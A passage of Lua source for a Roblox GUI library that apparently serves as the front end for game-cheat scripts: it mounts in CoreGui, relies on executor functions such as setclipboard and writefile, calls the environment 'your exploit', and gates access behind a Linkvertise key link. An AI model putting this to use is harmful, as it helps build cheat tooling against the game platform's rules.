local location
if game:GetService("RunService"):IsStudio() then
	location = game.Players.LocalPlayer.PlayerGui
else
	location = game.CoreGui
end

for _,v in pairs(location:GetChildren()) do
	if v.Name == "dark_UI" then
		v:Destroy()
	end
end

local dark_UI = Instance.new("ScreenGui")
dark_UI.Name = "dark_UI"
dark_UI.ResetOnSpawn = false
dark_UI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
dark_UI.ScreenInsets = Enum.ScreenInsets.None
dark_UI.Parent = location

local Library = {}
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local HTTPService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")

function Library:Create(config)
	local windowName = config.Name
	local darkerColor = Color3.new(config.ThemeColor.R / 2, config.ThemeColor.G / 2, config.ThemeColor.B / 2)
	local PitchColor = Color3.new(config.ThemeColor.R / 3, config.ThemeColor.G / 3, config.ThemeColor.B / 3)
	local lighterColor = Color3.new(config.ThemeColor.R * 2, config.ThemeColor.G * 2, config.ThemeColor.B * 2)
	local brightColor = Color3.new(config.ThemeColor.R * 3, config.ThemeColor.G * 3, config.ThemeColor.B * 3)

	local PitchHoverColor = Color3.new(config.ThemeColor.R / 2.5, config.ThemeColor.G / 2.5, config.ThemeColor.B / 2.5)

	local everyClipboard = nil
	if not RunService:IsStudio() then
		everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
	end

	local function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
		else
			print("Your exploit doesn't have the ability to use the clipboard")
		end
	end

	local keyWorked = false

	if not config.Key then
		keyWorked = true
	end

	-- key stuff

	task.spawn(function()
		if config.Key then
			local mainKey = Instance.new("Frame")
			mainKey.Name = "main"
			if config.ThemeGradient then
				mainKey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			else
				mainKey.BackgroundColor3 = config.ThemeColor
			end
			mainKey.BackgroundTransparency = 0.1
			mainKey.AnchorPoint = Vector2.new(0.5, 0.5)
			mainKey.Position = UDim2.new(0.5, 0, 0.5, 0)
			mainKey.Size = UDim2.fromOffset(350, 170)

			local bgGrad = Instance.new("UIGradient")
			bgGrad.Rotation = 90
			if config.ThemeGradient then
				bgGrad.Color = ColorSequence.new(config.ThemeColor, config.ThemeGradient)
			else
				bgGrad.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(156, 156, 156))
			end
			bgGrad.Parent = mainKey

			local textboxKey = Instance.new("TextBox")
			textboxKey.Name = "key"
			textboxKey.Font = config.ThemeFont
			textboxKey.Text = ""
			textboxKey.PlaceholderText = "enter key here.."
			textboxKey.BackgroundTransparency = 0.7
			textboxKey.BorderSizePixel = 0
			textboxKey.TextColor3 = lighterColor
			textboxKey.TextScaled = true
			textboxKey.AnchorPoint = Vector2.new(0.5, 0.5)
			textboxKey.Position = UDim2.new(0.5, 0, 0.6, 0)
			textboxKey.Size = UDim2.fromOffset(300, 90)
			textboxKey.Parent = mainKey

			Instance.new("UICorner", textboxKey)

			local outline = Instance.new("UIStroke")
			outline.Color = lighterColor
			outline.Thickness = 2
			outline.Transparency = 0.5
			outline.Parent = mainKey
			local outgrad = Instance.new("UIGradient")
			outgrad.Rotation = 110
			outgrad.Color = ColorSequence.new(brightColor, darkerColor)
			outgrad.Parent = outline

			local title = Instance.new("TextLabel")
			title.Name = "title"
			title.Font = config.ThemeFont
			title.Text = windowName
			title.TextColor3 = lighterColor
			title.TextSize = 20
			title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			title.BackgroundTransparency = 1
			title.AnchorPoint = Vector2.new(0.5, 0)
			title.Position = UDim2.new(0.5, 0, 0.06, 0)
			title.Size = UDim2.fromOffset(83, 28)
			title.Parent = mainKey

			local copyLink = Instance.new("TextButton")
			copyLink.Name = "copy"
			copyLink.Font = config.ThemeFont
			copyLink.Text = ""
			copyLink.TextColor3 = lighterColor
			copyLink.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			copyLink.BackgroundTransparency = 0
			copyLink.AnchorPoint = Vector2.new(0.5, -1)
			copyLink.Position = UDim2.new(0.8, 0, -0.2, 0)
			copyLink.Size = UDim2.fromOffset(100, 28)
			copyLink.TextScaled = true
			if config.ThemeGradient then
				copyLink.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			else
				copyLink.BackgroundColor3 = config.ThemeColor
			end
			local copyLinkText = Instance.new("TextLabel")
			copyLinkText.Font = config.ThemeFont
			copyLinkText.Text = "Copy Linkvertise"
			copyLinkText.TextColor3 = lighterColor
			copyLinkText.TextScaled = true
			copyLinkText.BackgroundTransparency = 1
			copyLinkText.Size = UDim2.new(1, 0, 1, 0)
			copyLinkText.Parent = copyLink
			copyLink.Parent = mainKey

			local bgGrad2 = Instance.new("UIGradient")
			bgGrad2.Rotation = 90
			if config.ThemeGradient then
				bgGrad2.Color = ColorSequence.new(config.ThemeColor, config.ThemeGradient)
			else
				bgGrad2.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(156, 156, 156))
			end
			bgGrad2.Parent = copyLink

			copyLink.MouseButton1Up:Connect(function()
				toClipboard("https://linkvertise.com/3251796/83SNJ1INhp1X?o=sharing")
			end)

			Instance.new("UICorner", copyLink)

			local uICorner = Instance.new("UICorner")
			uICorner.Name = "uICorner"
			uICorner.Parent = mainKey

			mainKey.Parent = dark_UI

			local keyIndex = 1

			textboxKey.FocusLost:Connect(function(enterPressed)
				if not enterPressed then return end

				local input = textboxKey.Text

				if table.find(config.Key, input) then
					keyWorked = true
					mainKey:Destroy()
				else
					textboxKey.Text = "incorrect key"
				end
			end)


		end
	end)
	--


	repeat task.wait() until keyWorked == true

	local toggless = {}
	local dragTween
	local DRAG_SMOOTHNESS = 0.12 -- lower = smoother, higher = snappier

	local main = Instance.new("Frame")
	main.Name = "main"
	if config.ThemeGradient then
		main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	else
		main.BackgroundColor3 = config.ThemeColor
	end
	main.BackgroundTransparency = 0.1
	main.Position = UDim2.fromScale(0.244, 0.292)
	main.Size = UDim2.fromOffset(488, 340)

	local draggingSFX = Instance.new("Sound")
	draggingSFX.Name = "draggingSFX"
	draggingSFX.SoundId = "rbxassetid://5113213873"
	draggingSFX.Volume = 0.06
	draggingSFX.Looped = true
	draggingSFX.PlaybackSpeed = 0
	draggingSFX.Parent = main

	local bgGrad = Instance.new("UIGradient")
	bgGrad.Rotation = 90
	if config.ThemeGradient then
		bgGrad.Color = ColorSequence.new(config.ThemeColor, config.ThemeGradient)
	else
		bgGrad.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(156, 156, 156))
	end
	bgGrad.Parent = main

	local outline = Instance.new("UIStroke")
	outline.Color = lighterColor
	outline.Thickness = 2
	outline.Transparency = 0.5
	outline.Parent = main
	local outgrad = Instance.new("UIGradient")
	outgrad.Rotation = 110
	outgrad.Color = ColorSequence.new(brightColor, darkerColor)
	outgrad.Parent = outline

	local title = Instance.new("TextLabel")
	title.Name = "title"
	title.Font = config.ThemeFont
	title.Text = windowName
	title.TextColor3 = lighterColor
	title.TextSize = 20
	title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	title.BackgroundTransparency = 1
	title.Position = UDim2.fromScale(0.41, 0.0543)
	title.Size = UDim2.fromOffset(83, 28)
	title.Parent = main

	local uICorner = Instance.new("UICorner")
	uICorner.Name = "uICorner"
	uICorner.Parent = main

	local tabContainer = Instance.new("Frame")
	tabContainer.Name = "tabContainer"
	tabContainer.BackgroundColor3 = darkerColor
	tabContainer.Position = UDim2.fromScale(0.0342, 0.188)
	tabContainer.Size = UDim2.fromOffset(454, 30)

	local toggleBarButton = Instance.new("ImageButton")
	toggleBarButton.Name = "toggleBarButton"
	toggleBarButton.Image = "rbxassetid://2418686949"
	toggleBarButton.BackgroundColor3 = darkerColor
	toggleBarButton.Position = UDim2.fromScale(0.903, 0.188)
	toggleBarButton.Size = UDim2.fromOffset(30, 30)
	toggleBarButton.Rotation = 180
	toggleBarButton.Visible = false
	toggleBarButton.AutoButtonColor = false
	toggleBarButton.Parent = main

	local uICornerb = Instance.new("UICorner")
	uICornerb.Name = "uICornerb"
	uICornerb.CornerRadius = UDim.new(0, 6)
	uICornerb.Parent = toggleBarButton

	if config.ToggledSideBar then
		toggleBarButton.Visible = true
		tabContainer.Size = UDim2.fromOffset(420, 30)

		local TogHolder = Instance.new("Frame")
		TogHolder.Size = UDim2.new(0.4, 0, 0.06, 0)
		TogHolder.Position = UDim2.new(1.02, 0, 0.02, 0)
		TogHolder.BackgroundTransparency = 1
		TogHolder.Visible = true
		TogHolder.Parent = main

		local uIListLayout = Instance.new("UIListLayout")
		uIListLayout.Name = "uIListLayout"
		uIListLayout.Padding = UDim.new(0, 8)
		uIListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
		uIListLayout.FillDirection = Enum.FillDirection.Vertical
		uIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uIListLayout.Parent = TogHolder

		toggleBarButton.MouseButton1Up:Connect(function()
			TogHolder.Visible = not TogHolder.Visible

			if TogHolder.Visible == true then
				TweenService:Create(toggleBarButton, TweenInfo.new(0.1), {Rotation = 180}):Play()
			else
				TweenService:Create(toggleBarButton, TweenInfo.new(0.1), {Rotation = 0}):Play()
			end
		end)

		local function createToggleVis(name, val)
			local rahh = Instance.new("TextLabel")
			rahh.Name = name
			rahh.Text = " " .. name
			rahh.Size = UDim2.new(1, 0, 1, 0)
			rahh.BackgroundTransparency = 1
			rahh.TextXAlignment = Enum.TextXAlignment.Left
			rahh.Font = config.ThemeFont
			rahh.TextColor3 = brightColor
			rahh.TextScaled = true
			rahh.TextStrokeTransparency = 0
			rahh.TextStrokeColor3 = darkerColor
			rahh.Parent = TogHolder
		end

		local lastValues = {}

		task.spawn(function()
			while task.wait() do
				for name, value in pairs(toggless) do
					if lastValues[name] ~= value then
						for _, v in pairs(TogHolder:GetChildren()) do
							if v:IsA("TextLabel") and v.Name ~= "Toggleso45y45fgvn" then
								v:Destroy()
							end
						end

						for name, value in pairs(toggless) do
							if toggless[name] == true then
								createToggleVis(name, value)
							end
						end

						lastValues[name] = value
					end
				end
			end
		end)
	end

	local uICorner1 = Instance.new("UICorner")
	uICorner1.Name = "uICorner1"
	uICorner1.CornerRadius = UDim.new(0, 6)
	uICorner1.Parent = tabContainer

	local uIListLayout = Instance.new("UIListLayout")
	uIListLayout.Name = "uIListLayout"
	uIListLayout.Padding = UDim.new(0, 8)
	uIListLayout.FillDirection = Enum.FillDirection.Horizontal
	uIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	uIListLayout.Parent = tabContainer

	local uIPadding = Instance.new("UIPadding")
	uIPadding.Name = "uIPadding"
	uIPadding.PaddingLeft = UDim.new(0, 7)
	uIPadding.PaddingTop = UDim.new(0, 4)
	uIPadding.Parent = tabContainer

	local clockLabel = Instance.new("TextLabel")
	clockLabel.Name = "clockLabel"
	clockLabel.Font = config.ThemeFont
	clockLabel.Text = "Time Open: 00:00"
	clockLabel.TextColor3 = lighterColor
	clockLabel.TextXAlignment = Enum.TextXAlignment.Left
	clockLabel.TextSize = 16
	clockLabel.BackgroundTransparency = 1
	clockLabel.Position = UDim2.fromScale(0.01, 0)
	clockLabel.Size = UDim2.fromOffset(100, 28)
	clockLabel.Parent = main

	local fps = Instance.new("TextLabel")
	fps.Name = "fps counter"
	fps.Font = config.ThemeFont
	fps.Text = "FPS: ?"
	fps.TextColor3 = lighterColor
	fps.TextXAlignment = Enum.TextXAlignment.Right
	fps.TextSize = 16
	fps.BackgroundTransparency = 1
	fps.Position = UDim2.fromScale(0.79, 0)
	fps.Size = UDim2.fromOffset(100, 28)
	fps.Parent = main

	local ping = Instance.new("TextLabel")
	ping.Name = "fps counter"
	ping.Font = config.ThemeFont
	ping.Text = "PING: ?ms"
	ping.TextColor3 = lighterColor
	ping.TextXAlignment = Enum.TextXAlignment.Right
	ping.TextSize = 16
	ping.BackgroundTransparency = 1
	ping.Position = UDim2.fromScale(0.79, 0.06)
	ping.Size = UDim2.fromOffset(100, 28)
	ping.Parent = main

	local dragging = false
	local hidden = false
	local ogPos = UDim2.new(0,0,0,0)

	if UserInputService.TouchEnabled then
		local mobileToggle = Instance.new("ImageButton")
		mobileToggle.Image = "rbxassetid://401613236"
		mobileToggle.Position = UDim2.new(0.687, 0, 0, 0)
		mobileToggle.Size = UDim2.new(0.065, 0, 0.09, 0)
		mobileToggle.BackgroundColor3 = config.ThemeColor
		local roun = Instance.new("UICorner")
		roun.Parent = mobileToggle
		local rat = Instance.new("UIAspectRatioConstraint")
		rat.Parent = mobileToggle
		mobileToggle.Parent = dark_UI

		local holdStart = 0
		local draggingMobile = false
		local touchConnection

		mobileToggle.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Touch then
				holdStart = tick()
				draggingMobile = false

				task.delay(1, function()
					if input.UserInputState == Enum.UserInputState.Begin and tick() - holdStart >= 1 then
						draggingMobile = true
					end
				end)
			end
		end)

		mobileToggle.InputChanged:Connect(function(input)
			if draggingMobile and input.UserInputType == Enum.UserInputType.Touch then
				mobileToggle.Position = UDim2.fromOffset(
					input.Position.X - mobileToggle.AbsoluteSize.X / 2,
					input.Position.Y - mobileToggle.AbsoluteSize.Y / 2
				)
			end
		end)

		mobileToggle.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Touch then
				-- if not dragging, treat it as a toggle
				if not draggingMobile then
					if dragging == false then
						if hidden == false then
							hidden = true
							ogPos = main.Position
							local b = UserInputService.TouchEnabled and 1.5 or 1.2
							game.TweenService:Create(main, TweenInfo.new(0.1), {
								Position = UDim2.new(0.5, 0, b, 0)
							}):Play()
						else
							hidden = false
							game.TweenService:Create(main, TweenInfo.new(0.1), {
								Position = ogPos
							}):Play()
						end
					end
				end
				draggingMobile = false
			end
		end)
	end


	local lastTime = tick()
	local frameCount = 0

	if not RunService:IsStudio() then
		RunService.RenderStepped:Connect(function()
			frameCount = frameCount + 1
			local currentTime = tick()
			if currentTime - lastTime >= 1 then
				fps.Text = "FPS: " .. frameCount
				frameCount = 0
				lastTime = currentTime
			end

			local pinge = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) -- seconds to milliseconds
			ping.Text = "PING: " .. pinge .. "ms"
		end)
	end

	tabContainer.Parent = main
	main.Parent = dark_UI
	main.AnchorPoint = Vector2.new(0.5,0.5)
	main.Position = UDim2.new(0.5,0,0.5,0)

	local tabHandler = {}
	tabHandler.Config = {
		save = function() end,
		load = function() end,
		getValue = function() end,
		setValue = function() end,
		setName = function() end,
		getName = function() end,
		list = function() end,
		delete = function() end,
	}

	local _CFG_DATA = {}
	local _CFG_FILE
	do
		local raw = tostring(windowName)
		local inner = raw:match("%((.-)%)")
		_CFG_FILE = (inner or raw):gsub("[^%w]", "")
		if _CFG_FILE == "" then _CFG_FILE = "default" end
	end
	local _CFG_FOLDER = "celeron"
	local _CFG_LOADING = false

	local function _CFG_save()
		if _CFG_LOADING then return end
		if not (writefile and isfolder and makefolder) then return end
		pcall(function()
			if not isfolder(_CFG_FOLDER) then makefolder(_CFG_FOLDER) end
			writefile(_CFG_FOLDER .. "/" .. _CFG_FILE .. ".json", HTTPService:JSONEncode(_CFG_DATA))
		end)
	end

	local function _CFG_load()
		if not (readfile and isfile) then return end
		pcall(function()
			local path = _CFG_FOLDER .. "/" .. _CFG_FILE .. ".json"
			if isfile(path) then
				local ok, decoded = pcall(HTTPService.JSONDecode, HTTPService, readfile(path))
				if ok and type(decoded) == "table" then
					_CFG_DATA = decoded
				end
			end
		end)
	end

	local function _CFG_get(key, default)
		local v = _CFG_DATA[key]
		if v == nil then return default end
		return v
	end

	local function _CFG_set(key, value)
		_CFG_DATA[key] = value
		_CFG_save()
	end

	_CFG_load()

	tabHandler.Config.save = _CFG_save
	tabHandler.Config.load = _CFG_load
	tabHandler.Config.getValue = _CFG_get
	tabHandler.Config.setValue = _CFG_set
	tabHandler.Config.setName = function(n) _CFG_FILE = tostring(n); _CFG_DATA = {}; _CFG_load() end
	tabHandler.Config.getName = function() return _CFG_FILE end
	tabHandler.Config.list = function()
		local out = {}
		if not listfiles then return out end
		local ok, files = pcall(listfiles, _CFG_FOLDER)
		if ok and type(files) == "table" then
			for _, f in ipairs(files) do
				local n = tostring(f):match(".*[/\\](.+)%.json$")
				if n then table.insert(out, n) end
			end
		end
		return out
	end
	tabHandler.Config.delete = function(n)
		if not delfile then return false end
		local path = _CFG_FOLDER .. "/" .. tostring(n) .. ".json"
		if isfile and isfile(path) then
			pcall(delfile, path)
			return true
		end
		return false
	end

	function tabHandler:Exit()
		local sfx = Instance.new("Sound")
		sfx.Parent = location
		sfx.SoundId = "rbxassetid://9125654187"
		sfx.Volume = 0.2
		sfx:Play()
		game.Debris:AddItem(sfx, 1)
		dark_UI:Destroy()
	end

	local function getCurrentTabInt()
		local currentTab = 0
		for i, v in pairs(main:GetChildren()) do
			if v.Name == "container" then
				currentTab += 1
			end
		end
		return currentTab
	end

	local function grad(obj, darker)
		local bgGrad = Instance.new("UIGradient")
		bgGrad.Rotation = 90
		bgGrad.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), darker or Color3.fromRGB(225, 225, 225))
		bgGrad.Parent = obj
	end

	local function hoverClickSFXs(button)
		button.MouseButton1Click:Connect(function()
			local sfx = Instance.new("Sound")
			sfx.Parent = location
			sfx.SoundId = "rbxassetid://6895079853"
			sfx.Volume = 0.2
			sfx:Play()
			game.Debris:AddItem(sfx, 0.5)
		end)
		button.MouseEnter:Connect(function()
			local sfx = Instance.new("Sound")
			sfx.Parent = location
			sfx.SoundId = "rbxassetid://10066942189"
			sfx.Volume = 0.2
			sfx:Play()
			game.Debris:AddItem(sfx, 0.2)
		end)
	end

	local function bubbleClick(button: TextButton)
		button.ClipsDescendants = true

		button.MouseButton1Click:Connect(function()
			local mousePos = UserInputService:GetMouseLocation()

			local relativeX = mousePos.X - button.AbsolutePosition.X
			local relativeY = (mousePos.Y - 55) - button.AbsolutePosition.Y 

			local bubble = Instance.new("Frame")
			bubble.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			bubble.BackgroundTransparency = 0.8
			bubble.BorderSizePixel = 0
			bubble.AnchorPoint = Vector2.new(0.5, 0.5)

			bubble.Position = UDim2.fromOffset(relativeX, relativeY)
			bubble.Size = UDim2.fromOffset(0, 0)
			bubble.Parent = button

			local corna = Instance.new("UICorner")
			corna.CornerRadius = UDim.new(1, 0)
			corna.Parent = bubble

			local endSize = math.max(button.AbsoluteSize.X, button.AbsoluteSize.Y) * 0.5

			local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
			local tween = TweenService:Create(bubble, tweenInfo, {
				Size = UDim2.fromOffset(endSize, endSize),
				BackgroundTransparency = 1
			})

			tween:Play()
			tween.Completed:Connect(function()
				bubble:Destroy()
			end)
		end)
	end

	local function toggleUI(inputObject, gameProcessedEvent)
		if not gameProcessedEvent then
			if inputObject.KeyCode == Enum.KeyCode.RightAlt then 
				if dragging == false then
					if hidden == false then
						hidden = true
						ogPos = main.Position
						local b = 1.4
						if UserInputService.TouchEnabled then
							b = 1.7
						end
						game.TweenService:Create(main, TweenInfo.new(0.1), {Position = UDim2.new(0.5, 0,b, 0)}):Play()
					else
						hidden = false
						game.TweenService:Create(main, TweenInfo.new(0.1), {Position = ogPos}):Play()
					end
				end
			end
		end
	end

	UserInputService.InputBegan:connect(toggleUI)

	function tabHandler:Tab(name)
		--// Creating the yttab
		local main1 = Instance.new("TextButton")
		main1.Name = name
		main1.Font = config.ThemeFont
		main1.Text = name
		main1.TextColor3 = Color3.fromRGB(255, 255, 255)
		main1.TextSize = 13
		main1.TextTransparency = 0.5
		main1.AutomaticSize = Enum.AutomaticSize.X
		main1.BackgroundColor3 = PitchColor
		main1.BackgroundTransparency = 1
		main1.Size = UDim2.fromOffset(10, 24)
		main1.Parent = tabContainer


		--// Creating the container
		local holda = Instance.new("Frame")
		holda.Name = "container"
		holda.BackgroundTransparency = 1
		holda.ClipsDescendants = true
		holda.Position = UDim2.fromScale(0.0342, 0.31)
		holda.Size = UDim2.fromOffset(454, 220)


		local container = Instance.new("Frame")
		container.Name = "containerr"
		container.BackgroundColor3 = darkerColor
		container.Size = UDim2.new(1, 0, 1, 0)

		local currentInt = getCurrentTabInt()
		holda:SetAttribute("ContainerInt", currentInt)

		container.Position = UDim2.new(currentInt, 0, 0, 0)

		local uICorner2 = Instance.new("UICorner")
		uICorner2.Name = "uICorner2"
		uICorner2.CornerRadius = UDim.new(0, 6)
		uICorner2.Parent = container

		local holder = Instance.new("ScrollingFrame")
		holder.Name = "holder"
		holder.ScrollBarImageColor3 = Color3.fromRGB(76, 76, 76)
		holder.ScrollBarThickness = 1
		holder.ScrollingDirection = Enum.ScrollingDirection.Y
		holder.CanvasSize = UDim2.new(0, 0, 0, 0)
		holder.AutomaticCanvasSize = Enum.AutomaticSize.Y
		holder.Active = true
		holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		holder.BackgroundTransparency = 1
		holder.BorderColor3 = Color3.fromRGB(33, 33, 33)
		holder.Position = UDim2.fromScale(0.0022, 0.00404)
		holder.Size = UDim2.fromOffset(452, 215)

		local uIPadding1 = Instance.new("UIPadding")
		uIPadding1.Name = "uIPadding1"
		uIPadding1.PaddingLeft = UDim.new(0, 5)
		uIPadding1.PaddingTop = UDim.new(0, 7)
		uIPadding1.Parent = holder

		local uIListLayout1 = Instance.new("UIListLayout")
		uIListLayout1.Name = "uIListLayout1"
		uIListLayout1.Padding = UDim.new(0, 3)
		uIListLayout1.SortOrder = Enum.SortOrder.LayoutOrder
		uIListLayout1.Parent = holder

		local uICorner11 = Instance.new("UICorner")
		uICorner11.Name = "uICorner11"
		uICorner11.CornerRadius = UDim.new(0, 6)
		uICorner11.Parent = holder

		holder.Parent = container
		container.Parent = holda
		holda.Visible = true
		holda.Parent = main

		--// Event
		hoverClickSFXs(main1)
		main1.MouseButton1Click:Connect(function()
			for _,v:Frame in pairs(location:FindFirstChild('dark_UI').main:GetChildren()) do
				if v.Name == "container" then
					local cont = v.containerr

					local po = v:GetAttribute("ContainerInt") - currentInt

					TweenService:Create(cont, TweenInfo.new(0.2), {Position = UDim2.new(po, 0, 0, 0)}):Play()
				end
			end


			for _,v in pairs(location['dark_UI'].main.tabContainer:GetChildren()) do
				if v:IsA('TextButton') then
					game:GetService('TweenService'):Create(v, TweenInfo.new(0.15), {TextTransparency = 0.5}):Play()
				end
			end

			holda.Visible = true
			holda.ZIndex = 1
			game:GetService('TweenService'):Create(main1, TweenInfo.new(0.15), {TextTransparency = 0}):Play()
		end)

		--// Elements
		local ElementHandler = {}
		local currentFolder = nil
		function ElementHandler:Label(text, desc)
			local label = Instance.new("Frame")
			label.Name = "label"
			label.BackgroundColor3 = PitchColor
			label.Size = UDim2.fromOffset(441, 32)
			label.Parent = holder

			grad(label)

			local uICorner3 = Instance.new("UICorner")
			uICorner3.Name = "uICorner3"
			uICorner3.CornerRadius = UDim.new(0, 6)
			uICorner3.Parent = label

			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "textLabel"
			textLabel.Font = config.ThemeFont
			textLabel.Text = text
			textLabel.TextColor3 = Color3.fromRGB(179, 179, 179)
			textLabel.TextSize = 13
			textLabel.TextStrokeColor3 = Color3.fromRGB(195, 195, 195)
			textLabel.TextXAlignment = Enum.TextXAlignment.Left
			textLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			textLabel.BackgroundTransparency = 1
			textLabel.Position = UDim2.fromScale(0.0181, 0)
			textLabel.Size = UDim2.fromScale(0.5, 1)
			textLabel.Parent = label
		end

		function ElementHandler:Banner(id, customHeight)
			local label = Instance.new("ImageLabel")
			label.Name = "banner"
			label.BackgroundColor3 = PitchColor
			if customHeight then
				label.Size = UDim2.fromOffset(441, customHeight)
			else
				label.Size = UDim2.fromOffset(441, 80)
			end
			label.Parent = holder
			label.Image = "rbxassetid://"..id
			label.ScaleType = Enum.ScaleType.Crop

			local uICorner3 = Instance.new("UICorner")
			uICorner3.Name = "uICorner3"
			uICorner3.CornerRadius = UDim.new(0, 6)
			uICorner3.Parent = label
		end

		function ElementHandler:Image(assetId, imageWidth, height, desc)
			height = height or 60

			-- Container
			local container = Instance.new("Frame")
			container.Name = "ImageContainer"
			container.BackgroundColor3 = PitchColor
			container.Size = UDim2.new(0, 0, 0, height)
			container.Size += UDim2.fromOffset(441, 0)
			container.AutomaticSize = desc and Enum.AutomaticSize.Y or Enum.AutomaticSize.None
			container.Parent = holder

			grad(container)

			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 6)
			corner.Parent = container

			-- Padding
			local padding = Instance.new("UIPadding")
			padding.PaddingTop = UDim.new(0, 6)
			padding.PaddingBottom = UDim.new(0, 6)
			padding.PaddingLeft = UDim.new(0, 6)
			padding.PaddingRight = UDim.new(0, 6)
			padding.Parent = container

			-- Vertical layout
			local layout = Instance.new("UIListLayout")
			layout.FillDirection = Enum.FillDirection.Vertical
			layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
			layout.SortOrder = Enum.SortOrder.LayoutOrder
			layout.Padding = UDim.new(0, 4)
			layout.Parent = container

			-- Image
			local img = Instance.new("ImageLabel")
			img.Name = "Image"
			img.Image = "rbxassetid://" .. assetId
			img.BackgroundTransparency = 1
			img.Size = UDim2.fromOffset(imageWidth, height - 12)
			img.Parent = container

			local imgCorner = Instance.new("UICorner")
			imgCorner.CornerRadius = UDim.new(0, 6)
			imgCorner.Parent = img

			-- Description (optional)
			if desc then
				local descLabel = Instance.new("TextLabel")
				descLabel.Name = "Description"
				descLabel.Font = config.ThemeFont
				descLabel.Text = desc
				descLabel.TextColor3 = Color3.fromRGB(203, 203, 203)
				descLabel.TextSize = 10
				descLabel.TextWrapped = true
				descLabel.TextXAlignment = Enum.TextXAlignment.Left
				descLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				descLabel.BackgroundTransparency = 1
				descLabel.Position = UDim2.fromScale(0.0181, 0.38)
				descLabel.Size = UDim2.fromOffset(1, 32)
				descLabel.Parent = container
			end

			return container
		end


		local startTime = tick()
		local function formatTime(seconds)
			local minutes = math.floor(seconds / 60)
			local remainingSeconds = math.floor(seconds % 60)
			return string.format("%02d:%02d", minutes, remainingSeconds)
		end

		game:GetService("RunService").Heartbeat:Connect(function()
			local elapsedTime = tick() - startTime
			clockLabel.Text = "Time Open: " .. formatTime(elapsedTime) 
		end)


		function ElementHandler:Button(text, desc, callback)
			text = text or "Button"
			if desc ~= string and not callback then
				callback = desc
				desc = nil
			end
			callback = callback or function() end

			local button = Instance.new("TextButton")
			button.Name = "button"
			button.BackgroundColor3 = PitchColor
			button.Position = UDim2.fromScale(0, 0.135)
			button.Size = UDim2.fromOffset(441, 32)
			button.Text = ""
			button.AutoButtonColor = false

			bubbleClick(button)
			grad(button)

			local uICorner12 = Instance.new("UICorner")
			uICorner12.Name = "uICorner12"
			uICorner12.CornerRadius = UDim.new(0, 6)
			uICorner12.Parent = button

			local textLabel5 = Instance.new("TextLabel")
			textLabel5.Name = "textLabel5"
			textLabel5.Font = config.ThemeFont
			textLabel5.Text = text
			textLabel5.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel5.TextSize = 13
			textLabel5.TextStrokeColor3 = Color3.fromRGB(195, 195, 195)
			textLabel5.TextXAlignment = Enum.TextXAlignment.Left
			textLabel5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			textLabel5.BackgroundTransparency = 1
			textLabel5.Position = UDim2.fromScale(0.0181, 0)
			textLabel5.Size = UDim2.fromScale(0.5, 1)
			textLabel5.Parent = button

			if desc then
				local desclabl = Instance.new("TextLabel")
				desclabl.Name = "desclabl"
				desclabl.Font = config.ThemeFont
				desclabl.Text = desc
				desclabl.TextColor3 = Color3.fromRGB(203, 203, 203)
				desclabl.TextSize = 10
				desclabl.TextStrokeColor3 = Color3.fromRGB(195, 195, 195)
				desclabl.TextXAlignment = Enum.TextXAlignment.Left
				desclabl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				desclabl.BackgroundTransparency = 1
				desclabl.Position = UDim2.fromScale(0.0181, 0.38)
				desclabl.Size = UDim2.fromOffset(1, 32)
				desclabl.Parent = button

				textLabel5.Size = UDim2.fromScale(0.5, 0.73)
				button.Size = UDim2.fromOffset(441, 42)
			end

			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Name = "imageLabel"
			imageLabel.Image = "rbxassetid://17007761669"
			imageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			imageLabel.BackgroundTransparency = 1
			imageLabel.Position = UDim2.fromScale(0.943, 0.219)
			imageLabel.Size = UDim2.fromOffset(18, 18)
			imageLabel.Parent = button

			button.Parent = holder
			hoverClickSFXs(button)
			button.MouseEnter:Connect(function()
				game:GetService('TweenService'):Create(button, TweenInfo.new(0.3), {BackgroundColor3 = PitchHoverColor}):Play()
			end)

			button.MouseLeave:Connect(function()
				game:GetService('TweenService'):Create(button, TweenInfo.new(0.3), {BackgroundColor3 = PitchColor}):Play()
			end)

			button.MouseButton1Click:Connect(function()
				callback()
			end)
		end

		function ElementHandler:Dropdown(text, list, desc, callback)
			text = text or "dropdown"
			if desc ~= string and not callback then
				callback = desc
				desc = nil
			end
			callback = callback or function() end

			local currentList = list

			local _key = tostring(name) .. "/" .. tostring(currentFolder or "") .. "/" .. tostring(text)

